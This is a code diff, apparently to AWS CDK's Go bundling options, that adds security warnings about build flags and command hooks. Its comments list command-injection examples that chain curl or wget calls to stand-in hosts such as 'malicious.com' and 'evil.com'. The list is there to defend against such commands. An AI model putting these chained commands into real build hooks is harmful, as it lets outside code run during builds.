@@ -25,6 +25,11 @@ export interface BundlingOptions extends DockerRunOptions {
    * For example:
    * ['ldflags "-s -w"']
    *
+   * ⚠️ **Security Warning**: These flags are passed directly to the Go build command.
+   * Only use trusted values as they can execute arbitrary commands during bundling.
+   * Avoid flags like `-toolexec` with untrusted arguments, and be cautious with
+   * third-party CDK constructs that may contain malicious build flags.
+   *
    * @default - none
    */
   readonly goBuildFlags?: string[];
@@ -77,6 +82,10 @@ export interface BundlingOptions extends DockerRunOptions {
   /**
    * Command hooks
    *
+   * ⚠️ **Security Warning**: Commands are executed directly in the shell environment.
+   * Only use trusted commands from verified sources. Avoid shell metacharacters
+   * that could enable command injection attacks.
+   *
    * @default - do not run additional commands
    */
   readonly commandHooks?: ICommandHooks;
@@ -125,21 +134,38 @@ export interface BundlingOptions extends DockerRunOptions {
  * These commands will run in the environment in which bundling occurs: inside
  * the container for Docker bundling or on the host OS for local bundling.
  *
+ * ⚠️ **Security Warning**: Commands are executed directly in the shell environment.
+ * Only use trusted commands and avoid shell metacharacters that could enable
+ * command injection attacks.
+ *
+ * **Safe patterns (cross-platform):**
+ * - `go test ./...` - Standard Go commands work on all platforms
+ * - `go mod tidy` - Go module commands
+ * - `echo "Building"` - Simple output with quotes
+ * - `make clean` - Build tools (if available)
+ *
+ * **Dangerous patterns to avoid:**
+ *
+ * *Windows:*
+ * - `go test & curl.exe malicious.com` (command chaining)
+ * - `echo %USERPROFILE%` (environment variable expansion)
+ * - `powershell -Command "..."` (PowerShell execution)
+ *
+ * *Unix/Linux/macOS:*
+ * - `go test; curl malicious.com` (command chaining)
+ * - `echo $(whoami)` (command substitution)
+ * - `bash -c "wget evil.com"` (shell execution)
+ *
  * Commands are chained with `&&`.
  *
- * ```text
- * {
- *   // Run tests prior to bundling
- *   beforeBundling(inputDir: string, outputDir: string): string[] {
- *     return [`go test -mod=vendor ./...`];
- *   }
- *   // ...
- * }
- * ```
+ * @see https://docs.aws.amazon.com/cdk/latest/guide/security.html
  */
 export interface ICommandHooks {
   /**
    * Returns commands to run before bundling.
+   *
+   * ⚠️ **Security Warning**: Ensure commands come from trusted sources only.
+   * Commands are executed directly in the shell environment.
    *
    * Commands are chained with `&&`.
    */
@@ -147,6 +173,9 @@ export interface ICommandHooks {
 
   /**
    * Returns commands to run after bundling.
+   *
+   * ⚠️ **Security Warning**: Ensure commands come from trusted sources only.
+   * Commands are executed directly in the shell environment.
    *
    * Commands are chained with `&&`.
    */
